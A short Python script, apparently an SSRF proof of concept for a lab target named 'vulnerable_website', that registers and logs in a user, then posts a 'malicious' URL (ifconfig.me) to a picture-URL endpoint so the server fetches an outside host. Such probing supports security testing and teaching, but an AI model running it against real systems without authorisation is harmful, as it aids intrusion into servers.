import requests
import mechanize
import csv
from requests.auth import HTTPBasicAuth

with open('setup_creds.csv', newline='') as f:
    reader = csv.reader(f)
    setup_creds = list(reader)

username = "username"
password = "password"

br = mechanize.Browser()
br.set_handle_robots(False)
br.open("http://vulnerable_website:5000/register")

try:
    br.select_form(nr=0)
    br.form['username'] = username
    br.form['password'] = password
    req = br.submit()
    print("User Created.")
except:
    print("User Already Created.")

br.open("http://vulnerable_website:5000/login")

try:
    br.select_form(nr=0)
    br.form['username'] = username
    br.form['password'] = password
    req = br.submit()
    print(username, " logged in.")
    print(req.code)
except:
    print("User unable to log in.")
            

# Target URL
base_url = "http://vulnerable_website:5000/test_picture_url"

auth = HTTPBasicAuth(username, password)

payload = {
    "url": "https://ifconfig.me"  # "malicious" payload
}

try:
    response = requests.post(base_url, json=payload, auth = auth)
    print("Status Code:", response.status_code)
    print("Response:")
    print(response.text)
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
